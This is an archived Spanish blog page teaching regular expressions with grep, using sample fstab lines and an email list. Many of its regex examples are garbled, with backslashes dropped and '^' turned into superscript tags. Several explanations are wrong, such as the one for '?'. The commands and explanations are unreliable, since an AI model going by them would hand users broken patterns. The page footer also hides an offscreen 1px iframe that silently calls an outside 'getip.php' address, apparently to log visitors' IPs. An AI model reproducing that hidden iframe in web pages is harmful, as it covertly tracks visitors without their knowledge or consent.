
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>expresiones-regulares - TRACTATUS ELEMENTALIS</title>
  <meta name="author" content="templix">

  
  <meta name="description" content="[regex o patrones] Buscar cadenas de texto que coinciden con un patrón. Los comandos más usuales que las emplean son grep, find, sed y awk y cada uno &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="https://tractatuslapipaplena.herokuapp.com/blog/expresiones-regulares">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="TRACTATUS ELEMENTALIS" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script src="/javascripts/links.js"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div align=center>
  <h1><a href="/">TRACTATUS ELEMENTALIS</a></h1>
  
    <h2>Apuntes sobre bash. Orgasmos con la terminal.</h2>
  </dev>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS"></a></li>
  
</ul>
  
<form action="https://www.google.com/search?q=site%3Atractatuslapipaplena.herokuapp.com&q=" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:tractatuslapipaplena.herokuapp.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/previa">Previa</a></li>
  <li><a href="/">Últimas</a></li>
  <li><a href="/blog/archives">Todas</a></li>
  <li><a href="/scripts">Scripts</a></li>
  <li><a href="http://www.lapipaplena.net">Web</a></li>
  <li><a href="http://lapipaplena.no-ip.org/wiki/">Wiki</a></li>
  <li><a href="http://anonops.es">Foro</a></li>
  <li><a href="http://panellpipa.no-ip.org">Socios</a></li>

</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Expresiones-regulares</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-12-15T18:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>[regex o patrones]</p>

<p>Buscar cadenas de texto que coinciden con un patrón. Los comandos más usuales que las emplean son grep, find, sed y awk y cada uno con sus pecualiaridades. Para ilustrar dichas expresiones se usa un archivo de texto al que llamo file.</p>

<blockquote><p>$ cat file</p></blockquote>

<h1>/etc/fstab: static file system information.</h1>

<p>UUID=de1d7793-c3d2-4e03-b79d-1a76905619e6 /               ext4    errors=remount-ro 0       1</p>

<p>UUID=ccc71238-d89d-435b-a4e2-c2d836f800bb none            swap    sw              0       0</p>

<p>/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0</p>

<p>/dev/sda5       /media/datos    ext4    defaults        0       0</p>

<p>/dev/sda7       /media/fotos    ext3    defaults        0       0</p>

<p>servidor:/home/templix /media/servidor  nfs4 defaults   0       0</p>

<h3>Otras cosas</h3>

<p>7592 esto es un número&#8230;.</p>

<p>la letra z es la última</p>

<p>aminora</p>

<p>mediaplayer es un reproductor</p>

<p>tres cincos hace 555</p>

<p>salta la rana</p>

<p>aRmARIO</p>

<p>Nota.- Los siguientes ejemplos se basarán en el comando grep. En algunos casos, al corresponder a expresiones regulares extendidas, se usará con el argumento -E. Las expresiones regulares han de ir siempre encerradas con comillas simples.</p>

<p>Literales (Sólo encajan con ellos mismos)</p>

<p>$ grep &#8216;media&#8217; file (mostrara las lineas que contengan &#8220;media&#8221; incluso &#8220;mediaplayer&#8221;)</p>

<p>$ grep &#8217;<media>&#8217; file (Sólo mostrará las que contengan exactamente &#8220;media&#8221;)</p>

<p>. [punto] (Cualquier caracter)</p>

<p>$ grep &#8216;me.ia&#8217; file (Misma salida que el anterior)</p>

<p>$ grep &#8216;&lt;m&#8230;a>&#8217; file (Mostrar las de cinco letras que empiecen por &#8220;m&#8221; y terminen en &#8220;a&#8221;)</p>

<p>$ grep &#8216;m&#8230;a>&#8217; file (Mostrar las lineas que contengan una palabra de cinco letras que empiece por &#8220;m&#8221; y termine con &#8220;a&#8221; sin nada a continuación)</p>

<p>[] [Corchetes] (Cualquier caracter de los encerrados entre corchetes)</p>

<p>$ grep &#8216;[wz]&#8217; file (Mostras las que contengan &#8220;w&#8221; o &#8220;z&#8221;)</p>

<p>$ grep &#8216;sda[0-9]&#8217; file (Mostrar las lineas con palabras que empiecen por sda seguidas de un número del 0 al 9)</p>

<p>$ grep &#8216;[0-9]-&#8217; file (Buscar lineas que tengan un número seguido de un -)</p>

<p>| [Tuberia] (Especificar varias opciones)</p>

<p>$ grep -E &#8216;e(xt|rvi)(3|dor)&#8217; file (Mostrar las que contengan ext3 y ervidor [servidor])</p>

<p>$ grep -E &#8216;datos|servidor&#8217; file (Mostrar las que tengan las palabras &#8220;datos&#8221; y &#8220;servidor&#8221;)</p>

<ul>
<li>[Guión] (Siempre que no siga a un corchete, especifica un rango)</li>
</ul>


<p>$ grep &#8216;[0-2]$&#8217; file (Lineas que contengan los números 0,1 y 2)</p>

<p>^ [Circunflejo] (Si va precedido de un corchete significa &#8220;todo lo que no sea lo que sigue&#8221;. En los demás casos significa &#8220;que la linea empiece por lo que sigue)</p>

<p>$ grep &#8217;<sup>UUID&#8217;</sup> file (Mostrar las que empiecen por UUID)</p>

<p>$ grep &#8216;:[<sup>/]&#8217;</sup> file (Las que tengan &#8220;:&#8221; y no vayan seguidos de una &#8220;/&#8221;)</p>

<p>$ grep -e &#8217;<sup>UUID&#8217;</sup> -e &#8217;<sup>/&#8217;</sup> file (Mostrar las que empiecen por UUID y por / . La barra de escape [] convierte al siguiente caracter en literal)</p>

<p>$ [Dolar] (Indica que el carácter precedente aparece al final de la linea)</p>

<p>$ grep &#8216;0$&#8217; file (Muestra las que terminen en 0)</p>

<p>grep &#8216;.$&#8217; file (Muestra las lineas que terminan con un punto)</p>

<ul>
<li>[Signo más] (Una o más veces).</li>
</ul>


<p>$ grep -E &#8216;-[0-9]+&#8217; file (Buscar las lineas con varios números precedidos por un guión [que ha de escaparse con una barra])</p>

<ul>
<li>(Asterisco) (Ninguna o más veces)</li>
</ul>


<p>$ grep -E &#8216;(fot).*&#8217; file (Mostrar las que tengan &#8220;fot&#8221; y puedan estar o no seguidas de otros caracteres)</p>

<p>? (Interrogante) (Un caracter impreciso)</p>

<p>$ grep -E &#8216;ext4?&#8217; file (indica que el caracter anterior [el 4] puede ser distinto de 4 o puede no existir, o sea que mostrará lineas que contengan ext4, ext3, ext&#8230;)</p>

<p>{n,m} [Llaves] (Que el caracter anterior a la llave se muestre las veces que indica entre el número n y el m. Si omitimos m significa como mínimo n veces.</p>

<p>$ grep &#8216;5{2,5}.*&#8217; file (Que se muestre las lineas que tengan un 5 entre dos y cinco veces. Las llaves se escapan)</p>

<p>$ grep &#8216;5{3}.*&#8217; file (Muestra las lineas en las que el 5 sale tres veces)</p>

<p>$ grep &#8216;5{3,}.*&#8217; file (Muestra las lineas en las que el 5 sale como mínimo tres veces)</p>

<p>b (Que lo precedente sea el final de una palabra. Siempre ha de escaparse.)</p>

<p>$ grep &#8216;sb&#8217; file (Muestra las lineas que contienen alguna palabra acabada en &#8220;s&#8221;)</p>

<p>Otros ejemplos:</p>

<p>Buscar las lineas que no empiecen por #:</p>

<p>$ grep -v &#8217;<sup>#&#8217;</sup> file</p>

<p>Mostrar lineas que empiecen por # y las que terminen en 0:</p>

<p>$ grep -E &#8217;<sup>#|0$&#8217;</sup> file</p>

<p>Buscar lineas que tengan : seguidos de una barra que ha de escaparse:</p>

<p>$ grep &#8216;:/&#8217; file</p>

<p>Buscar las lineas que tengan una &#8220;o&#8221; seguida de al menos 3 dígitos:</p>

<p>$ grep &#8216;o[0-9]{3}&#8217; file</p>

<p>Buscar lineas que tengan algún dígito:</p>

<p>$ grep &#8216;[[:digit:]]&#8217; file</p>

<p>Buscar lineas que empiecen por un caracter alfabético:</p>

<p>$ grep &#8217;<sup>[[:alpha:]]&#8217;</sup> file</p>

<p>Buscar lineas que tengan &#8220;ext&#8221; usando parentesis:</p>

<p>$ grep &#8216;(ext)&#8217; file</p>

<p>Buscar lineas que que tengan un número entre 2 y 9 al menos una vez y esten precedidos de espacio, tabulación o salto de linea:</p>

<p>$grep -E &#8216;s[2-9]+&#8217; file</p>

<p>Mostrar lineas con entre 3 y 6 letras mayúsculas:</p>

<p>$ grep &#8216;[A-Z]{3,6}&#8217; file</p>

<p>Algunos casos comentados:</p>

<p>1.-</p>

<blockquote><p>$ touch nada.8.sh.5</p></blockquote>

<p>$ ls | grep &#8216;.<em>.[6-8].</em>.[1-6]&#8217;</p>

<p>Nota.- Cuando se usen con el comando grep han de ir siempre encerradas con comillas simples.</p>

<p>.* (Cero o más caracteres. El punto inicial es imprescindible)</p>

<p>.[6-8] (Seguidos de un punto y un número que contenga entre el 6 y el 8)</p>

<p>.* (seguido un punto y cero o más caracteres)</p>

<p>.[1-6] (y terminado con un punto seguido de un número que contenga del 1 al 6)</p>

<p>Nota.- Los corchetes NO indican UN número de un dígito sinó un número que contenga el margen especificado [6,7,8 para el primer corchete y 1,2,3,4,5,6 para el segundo, por tanto también listaría el archivo nada.0357.sh.389 pero no nada.0352.sh.389 porque el número 0352 no contiene ninguno del margen especificado.</p>

<p>Nótese la diferencia en la expresión regular usando el comando mv [sin comillas simples y sin el punto delante del primer asterisco]:</p>

<p>$ mv <em>.[6-8].</em>.[1-6] prueba</p>

<p>2.-</p>

<p>Buscar en el directorio scripts, todos los que sean de bash:</p>

<p>$ grep -i &#8217;<sup>#.*bash&#8217;</sup> scripts/*</p>

<p>^#.*bash (Que el primer caracter de la primera linea sea # y que despues de cero o más caracteres aparezca la palabra bash)</p>

<p>$ grep -i &#8216;$.*bash&#8217; scripts</p>

<p>&#8217;$.*bash&#8217; (En todos los ficheros del directorio, que al final de la primera linea y despues de cero o más caracteres apararezca la palabra bash)</p>

<p>3.-</p>

<p>Ver los correos electrónicos completos de una lista en la que los hay incompletos:</p>

<blockquote><p>$ cat lista</p></blockquote>

<p>juangomez@gmail.com</p>

<p>clarafuentes@</p>

<p>@yahoo.es</p>

<p>ant.rodri-perez@hotmail.nadadenada</p>

<p>pedro@blog.empresa.travel</p>

<hr />

<p>$ grep -E &#8217;<sup>[a-zA-Z._-]+@[a-zA-Z0-9.]+.[a-z]+$&#8217;</sup> lista</p>

<p>^[a-zA-Z._-]+ (Que empiece con una palabra que pueda contener mayúsculas, minúsculas, puntos, guiones o guiones bajos)</p>

<p>@ (Seguida de una @ literal)</p>

<p>[a-zA-Z0-9.]+ (A continuación varios caracteres que pueden ser mayúsculas, minúsculas, puntos o números)</p>

<p>. (Después un punto literal)</p>

<p>[a-z]+$ (Para terminar, uno o varios caracteres en minúscula)</p>

<p>$ grep -E &#8217;<sup>[a-zA-Z._-]+@.[a-zA-Z.0-9]+.[[:alpha:]]{2,3}$&#8217;</sup> lista (Sólo mostrará las que terrminen con 2 o 3 letras)</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Escrito por la Pipa Plena. Gestor del blog <span class="fn">templix</span></span>

      








  


<time datetime="2013-12-15T18:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
      


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="https://tractatuslapipaplena.herokuapp.com/blog/expresiones-regulares/" data-via="" data-counturl="https://tractatuslapipaplena.herokuapp.com/blog/expresiones-regulares/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/expr/" title="Previous Post: expr">&laquo; expr</a>
      
      
        <a class="basic-alignment right" href="/blog/ext4magic/" title="Next Post: ext4magic">ext4magic &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
<h1>Número de entradas</h1>
        <ul>
        <li>1354</li>
        </ul>
</section>
<section>
  <h1>Añadidos/modificados</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/zypper/">zypper</a>
      </li>
    
      <li class="post">
        <a href="/blog/zmore/">zmore</a>
      </li>
    
      <li class="post">
        <a href="/blog/zmap/">zmap</a>
      </li>
    
      <li class="post">
        <a href="/blog/zless/">zless</a>
      </li>
    
      <li class="post">
        <a href="/blog/zip/">zip</a>
      </li>
    
      <li class="post">
        <a href="/blog/zgrep/">zgrep</a>
      </li>
    
      <li class="post">
        <a href="/blog/zfgrep/">zfgrep</a>
      </li>
    
      <li class="post">
        <a href="/blog/zenity/">zenity</a>
      </li>
    
      <li class="post">
        <a href="/blog/zegrep/">zegrep</a>
      </li>
    
      <li class="post">
        <a href="/blog/zdump/">zdump</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>Sobre mi</h1> 
  <center>
  <img src="/images/linux_user.png" title="Linux user">
  </center>
  <p>Soy un /dev de lo más normal, con ciertas deficiencias en el xorg.conf como casi todo el mundo, con una apariencia común tirando a gráfica VGA y con algún pixel algo deteriorado y que vivirá hasta que su directorio / sufra un kernel pánic y me mande a /dev/null</p>
</section>

<section class="googleplus">
  <h1>
    <a href="https://plus.google.com/107431970267257491799?rel=author">
      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
      Google+
    </a>
  </h1>
</section>


<section>
  <h1>Blogs útiles</h1>
  <ul>
      <li><a href="http://distrowatch.com">Distrowatch</a></li>
      <li><a href="http://es.wikipedia.org/wiki/Lista_de_n%C3%BAmeros_de_puerto">Listado de puertos</a></li>
      <li><a href="http://livecdlist.com/">LiveCDs</a></li>
      <li><a href="http://perseosblog.com">Perseosblog</a><li>
   </ul>
</section>
<section>
<table border="0" cellspacing="0" cellpadding="0"><tr><td align="center"><script type="text/javascript" src="http://www.worldtimeserver.com/clocks/embed.js"></script><script type="text/javascript" language="JavaScript">objES=new Object;objES.wtsclock="wtsclock001.swf";objES.color="CC6600";objES.wtsid="ES";objES.width=200;objES.height=200;objES.wmode="transparent";showClock(objES);</script></td></tr></table>
</section>
<section>
	<h1>IP visitante</h1>
	<script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=0&cn=0&ip=1"></script>
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - templix -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>




<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
</div>

</body>
</html>
